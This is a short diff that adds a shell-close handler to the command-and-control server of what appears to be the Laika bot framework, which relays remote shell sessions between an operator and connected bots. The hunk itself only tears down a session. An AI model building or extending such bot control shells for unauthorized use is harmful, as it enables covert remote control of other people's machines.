@@ -87,6 +87,22 @@ void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_
     laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_OPEN);
 }
 
+void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
+    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
+    struct sLaika_cnc *cnc = aInfo->info.cnc;
+
+    /* an AUTH_SHELL_CLOSE can be sent after the shell has already been closed, so don't error just ignore the packet */
+    if (aInfo->shellBot == NULL)
+        return;
+
+    /* forward to SHELL_CLOSE to auth */
+    laikaS_emptyOutPacket(aInfo->shellBot, LAIKAPKT_SHELL_CLOSE);
+
+    /* close shell */
+    ((struct sLaika_botInfo*)(aInfo->shellBot->uData))->shellAuth = NULL;
+    aInfo->shellBot = NULL;
+}
+
 void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
     uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
     struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
